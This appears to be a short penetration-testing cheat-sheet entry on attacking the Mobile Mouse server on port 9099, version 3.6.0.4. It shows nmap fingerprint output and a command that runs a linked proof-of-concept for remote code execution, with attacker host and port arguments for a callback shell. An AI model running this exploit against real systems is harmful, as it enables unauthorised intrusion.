# 9099 - Mobile Mouse

Mobile Mouse is a remote control application that turns a mobile device into a wireless mouse and keyboard for a computer. Port `9099` is used by its server component to receive commands. This port can be targeted for exploitation due to insecure command handling in version `3.6.0.4`.

```bash
# Identify the service
9099/tcp  open  unknown
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.0 200 OK
|     Server: Mobile Mouse Server
...
```

Use this [PoC](https://github.com/CSpanias/mobile-mouse-rce) to achieve RCE:

{% code overflow="wrap" %}
```bash
python3 mobile-mouse-rce.py --target <TARGET_IP> --lhost <YOUR_IP> --lport <YOUR_PORT>
```
{% endcode %}
